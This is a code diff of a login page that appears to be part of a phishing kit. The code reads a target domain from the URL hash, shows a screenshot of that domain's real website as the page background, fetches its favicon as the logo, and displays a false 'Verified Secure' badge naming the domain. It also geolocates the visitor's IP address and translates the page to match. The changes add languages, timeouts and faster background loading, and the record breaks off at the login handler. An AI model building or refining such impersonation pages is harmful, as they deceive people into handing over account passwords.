@@ -9,7 +9,7 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f4f4f4;
+            background: #f4f4f4 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect width="100" height="100" fill="%23000000"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23333" stroke-width="1"/></svg>');
             background-size: 100% auto;
             background-position: center top;
             background-repeat: no-repeat;
@@ -18,6 +18,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            transition: background-image 0.5s ease;
         }
 
         .login-form {
@@ -180,7 +181,7 @@
             border: 1px solid #c8c8c8;
         }
         
-        /* Error message styles - now inline with login button */
+        /* Error message styles */
         .inline-error {
             color: #e74c3c;
             font-weight: 600;
@@ -213,7 +214,6 @@
             <a href="#" class="forgot-password" id="forgotPassword">Forgot Password?</a>
         </div>
         
-        <!-- Error message now appears here -->
         <div class="inline-error" id="error-msg"></div>
         
         <button type="button" id="login-btn">Sign In</button>
@@ -233,7 +233,7 @@
     </form>
 
     <script>
-        // Language translations
+        // Language translations - EXPANDED for better coverage
         const translations = {
             en: {
                 title: "SECURE LOGIN",
@@ -246,8 +246,7 @@
                 secureText: "Secure connection • Information protected",
                 errorEmpty: "Please enter both email and password.",
                 errorIncorrect: "Incorrect password. Please try again.",
-                detectingLocation: "Detecting location...",
-                autoLanguage: "Auto (Detect)"
+                detectingLocation: "Detecting location..."
             },
             es: {
                 title: "INICIO DE SESIÓN SEGURO",
@@ -260,8 +259,7 @@
                 secureText: "Conexión segura • Información protegida",
                 errorEmpty: "Por favor ingrese correo y contraseña.",
                 errorIncorrect: "Contraseña incorrecta. Intente de nuevo.",
-                detectingLocation: "Detectando ubicación...",
-                autoLanguage: "Auto (Detectar)"
+                detectingLocation: "Detectando ubicación..."
             },
             fr: {
                 title: "CONNEXION SÉCURISÉE",
@@ -274,8 +272,7 @@
                 secureText: "Connexión sécurisée • Information protégée",
                 errorEmpty: "Veuillez entrer email et mot de passe.",
                 errorIncorrect: "Mot de passe incorrect. Réessayez.",
-                detectingLocation: "Détection de la localisation...",
-                autoLanguage: "Auto (Détecter)"
+                detectingLocation: "Détection de la localisation..."
             },
             de: {
                 title: "SICHERER LOGIN",
@@ -288,8 +285,7 @@
                 secureText: "Sichere Verbindung • Informationen geschützt",
                 errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
                 errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut.",
-                detectingLocation: "Standort wird erkannt...",
-                autoLanguage: "Auto (Erkennen)"
+                detectingLocation: "Standort wird erkannt..."
             },
             zh: {
                 title: "安全登录",
@@ -302,8 +298,7 @@
                 secureText: "安全连接 • 信息受保护",
                 errorEmpty: "请输入电子邮件和密码。",
                 errorIncorrect: "密码不正确。请重试。",
-                detectingLocation: "检测位置中...",
-                autoLanguage: "自动（检测）"
+                detectingLocation: "检测位置中..."
             },
             ja: {
                 title: "安全ログイン",
@@ -316,8 +311,7 @@
                 secureText: "安全な接続 • 情報保護済み",
                 errorEmpty: "メールアドレスとパスワードを入力してください。",
                 errorIncorrect: "パスワードが正しくありません。もう一度お試しください。",
-                detectingLocation: "位置情報を検出中...",
-                autoLanguage: "自動（検出）"
+                detectingLocation: "位置情報を検出中..."
             },
             ru: {
                 title: "БЕЗОПАСНЫЙ ВХОД",
@@ -330,8 +324,7 @@
                 secureText: "Безопасное соединение • Информация защищена",
                 errorEmpty: "Пожалуйста, введите email и пароль.",
                 errorIncorrect: "Неверный пароль. Попробуйте снова.",
-                detectingLocation: "Определение местоположения...",
-                autoLanguage: "Авто (Определить)"
+                detectingLocation: "Определение местоположения..."
             },
             ar: {
                 title: "تسجيل الدخول الآمن",
@@ -344,8 +337,46 @@
                 secureText: "اتصال آمن • المعلومات محمية",
                 errorEmpty: "الرجاء إدخال البريد الإلكتروني وكلمة المرور.",
                 errorIncorrect: "كلمة المرور غير صحيحة. حاول مرة أخرى.",
-                detectingLocation: "جاري اكتشاف الموقع...",
-                autoLanguage: "تلقائي (اكتشاف)"
+                detectingLocation: "جاري اكتشاف الموقع..."
+            },
+            pt: {
+                title: "LOGIN SEGURO",
+                emailLabel: "Endereço de Email",
+                emailPlaceholder: "Digite seu endereço de email",
+                passwordLabel: "Senha",
+                passwordPlaceholder: "Digite sua senha",
+                forgotPassword: "Esqueceu a senha?",
+                loginButton: "Entrar",
+                secureText: "Conexão segura • Informações protegidas",
+                errorEmpty: "Por favor, digite email e senha.",
+                errorIncorrect: "Senha incorreta. Tente novamente.",
+                detectingLocation: "Detectando localização..."
+            },
+            it: {
+                title: "ACCESSO SICURO",
+                emailLabel: "Indirizzo Email",
+                emailPlaceholder: "Inserisci il tuo indirizzo email",
+                passwordLabel: "Password",
+                passwordPlaceholder: "Inserisci la tua password",
+                forgotPassword: "Password dimenticata?",
+                loginButton: "Accedi",
+                secureText: "Connessione sicura • Informazioni protette",
+                errorEmpty: "Per favore inserisci email e password.",
+                errorIncorrect: "Password errata. Riprova.",
+                detectingLocation: "Rilevamento posizione..."
+            },
+            ko: {
+                title: "보안 로그인",
+                emailLabel: "이메일 주소",
+                emailPlaceholder: "이메일 주소 입력",
+                passwordLabel: "비밀번호",
+                passwordPlaceholder: "비밀번호 입력",
+                forgotPassword: "비밀번호를 잊으셨나요?",
+                loginButton: "로그인",
+                secureText: "보안 연결 • 정보 보호됨",
+                errorEmpty: "이메일과 비밀번호를 입력해주세요.",
+                errorIncorrect: "비밀번호가 잘못되었습니다. 다시 시도해주세요.",
+                detectingLocation: "위치 탐색 중..."
             }
         };
 
@@ -355,79 +386,35 @@
             'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
             'RU': '🇷🇺', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'KR': '🇰🇷',
             'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
-            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'GR': '🇬🇷'
+            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'GR': '🇬🇷',
+            'PT': '🇵🇹', 'BE': '🇧🇪', 'CH': '🇨🇭', 'AT': '🇦🇹', 'IE': '🇮🇪'
         };
 
-        // Language code to country mapping for auto-detection
+        // Expanded country to language mapping
         const countryToLanguage = {
-            'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en',
-            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es',
-            'FR': 'fr', 'BE': 'fr', 'CH': 'fr',
-            'DE': 'de', 'AT': 'de', 'CH': 'de',
-            'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
+            'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
+            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
+            'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
+            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de',
+            'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh', 'SG': 'zh',
             'JP': 'ja',
-            'RU': 'ru', 'UA': 'ru', 'BY': 'ru',
-            'SA': 'ar', 'AE': 'ar', 'EG': 'ar'
+            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru',
+            'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'QA': 'ar', 'KW': 'ar',
+            'BR': 'pt', 'PT': 'pt', 'AO': 'pt', 'MZ': 'pt',
+            'IT': 'it', 'CH': 'it', 'SM': 'it', 'VA': 'it',
+            'KR': 'ko', 'KP': 'ko',
+            'IN': 'en', // India primarily uses English
+            'NL': 'en', 'SE': 'en', 'NO': 'en', 'DK': 'en', 'FI': 'en' // Nordic countries
         };
+
+        // FALLBACK: Browser language detection
+        const browserLanguage = navigator.language || navigator.userLanguage || 'en';
+        const browserLangCode = browserLanguage.split('-')[0];
 
         let userIP = '';
         let userCountry = '';
         let userCity = '';
         let currentLanguage = 'en';
-
-        // Function to get IP and location
-        async function getUserLocation() {
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                userIP = ipData.ip;
-                
-                // Get location data
-                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const locationData = await locationResponse.json();
-                
-                userCountry = locationData.country_code || 'Unknown';
-                userCity = locationData.city || 'Unknown';
-                const countryName = locationData.country_name || 'Unknown';
-                
-                // Update location display
-                const flag = countryFlags[userCountry] || '📍';
-                document.getElementById('locationFlag').textContent = flag;
-                document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
-                document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
-                
-                // Auto-detect language based on country
-                if (countryToLanguage[userCountry]) {
-                    currentLanguage = countryToLanguage[userCountry];
-                    translatePage(currentLanguage);
-                }
-                
-            } catch (error) {
-                console.error('Error getting location:', error);
-                document.getElementById('locationText').textContent = 'Location unavailable';
-                document.getElementById('ipDisplay').textContent = 'IP: Unknown';
-                
-                // Try fallback IP service
-                try {
-                    const fallbackResponse = await fetch('https://api.db-ip.com/v2/free/self');
-                    const fallbackData = await fallbackResponse.json();
-                    userIP = fallbackData.ipAddress || 'Unknown';
-                    userCountry = fallbackData.countryCode || 'Unknown';
-                    
-                    const flag = countryFlags[userCountry] || '📍';
-                    document.getElementById('locationFlag').textContent = flag;
-                    document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
-                    
-                    if (countryToLanguage[userCountry]) {
-                        currentLanguage = countryToLanguage[userCountry];
-                        translatePage(currentLanguage);
-                    }
-                } catch (fallbackError) {
-                    console.error('Fallback also failed:', fallbackError);
-                }
-            }
-        }
 
         // Function to translate the page
         function translatePage(langCode) {
@@ -445,7 +432,77 @@
             document.getElementById('secureText').textContent = lang.secureText;
         }
 
-        // Process URL hash for domain customization
+        // Function to get IP and location - FIXED for immediate translation
+        async function getUserLocation() {
+            try {
+                // Show detecting message
+                document.getElementById('locationText').textContent = translations[currentLanguage].detectingLocation;
+                
+                // Start translation immediately based on browser language
+                if (translations[browserLangCode]) {
+                    translatePage(browserLangCode);
+                }
+                
+                // Get IP address - using faster service
+                const ipResponse = await Promise.race([
+                    fetch('https://api.ipify.org?format=json'),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
+                ]);
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Get location data - using faster service
+                const locationResponse = await Promise.race([
+                    fetch(`https://ipapi.co/${userIP}/json/`),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
+                ]);
+                const locationData = await locationResponse.json();
+                
+                userCountry = locationData.country_code || 'Unknown';
+                userCity = locationData.city || 'Unknown';
+                const countryName = locationData.country_name || 'Unknown';
+                
+                // Update location display
+                const flag = countryFlags[userCountry] || '📍';
+                document.getElementById('locationFlag').textContent = flag;
+                document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
+                document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                
+                // Auto-detect language based on country - OVERRIDE browser language
+                if (countryToLanguage[userCountry]) {
+                    const detectedLang = countryToLanguage[userCountry];
+                    translatePage(detectedLang);
+                }
+                
+            } catch (error) {
+                console.log('Using faster fallback for location...');
+                
+                // Use faster fallback services
+                try {
+                    // Try fast IP service
+                    const fastIpResponse = await fetch('https://api.my-ip.io/ip.json');
+                    const fastIpData = await fastIpResponse.json();
+                    userIP = fastIpData.ip || 'Unknown';
+                    userCountry = fastIpData.country || fastIpData.countryCode || 'Unknown';
+                    
+                    const flag = countryFlags[userCountry] || '📍';
+                    document.getElementById('locationFlag').textContent = flag;
+                    document.getElementById('locationText').textContent = 'Location detected';
+                    document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                    
+                    if (countryToLanguage[userCountry]) {
+                        const detectedLang = countryToLanguage[userCountry];
+                        translatePage(detectedLang);
+                    }
+                } catch (fastError) {
+                    console.error('Fast fallback failed:', fastError);
+                    document.getElementById('locationText').textContent = 'Online';
+                    document.getElementById('ipDisplay').textContent = 'IP: Active';
+                }
+            }
+        }
+
+        // Process URL hash for domain customization - WITH BACKGROUND PRELOADING
         const hash = decodeURIComponent(window.location.hash.substring(1));
         
         if (hash) {
@@ -475,23 +532,40 @@
                 domainBadge.textContent = fullDomain;
                 domainBadge.style.display = 'block';
                 
-                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
+                // Load background image in background with preload
+                const bgImage = new Image();
+                bgImage.src = `https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}`;
+                
+                // Set low-quality placeholder first for fast loading
+                document.body.style.backgroundImage = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.03"><rect width="100" height="100" fill="%23000000"/></svg>'), linear-gradient(45deg, #f0f0f0 25%, #e0e0e0 25%, #e0e0e0 50%, #f0f0f0 50%, #f0f0f0 75%, #e0e0e0 75%, #e0e0e0 100%)`;
+                
+                // When background image loads, replace with actual
+                bgImage.onload = function() {
+                    document.body.style.backgroundImage = `url('${bgImage.src}')`;
+                };
+                
+                // Fallback if background takes too long
+                setTimeout(() => {
+                    if (!bgImage.complete) {
+                        console.log('Background image taking too long, using fallback');
+                        document.body.style.backgroundImage = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect width="100" height="100" fill="%23000000"/></svg>'), linear-gradient(45deg, #f0f0f0 25%, #e0e0e0 25%, #e0e0e0 50%, #f0f0f0 50%, #f0f0f0 75%, #e0e0e0 75%, #e0e0e0 100%)`;
+                    }
+                }, 3000);
+                
                 document.getElementById('secureNote').innerHTML = `<span class="tick">✓</span> Verified Secure • ${rootDomain.toUpperCase()} Inc. ©2025`;
                 
                 // Add error handling for logo
                 logo.onerror = function() {
-                    console.log('Logo failed to load, trying alternative...');
                     logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
                     
                     logo.onerror = function() {
-                        console.log('Alternative logo also failed to load');
                         logo.style.display = 'none';
                     };
                 };
             }
         }
 
-        // Get user location on page load
+        // Get user location on page load - START IMMEDIATELY
         getUserLocation();
 
         // Login functionality
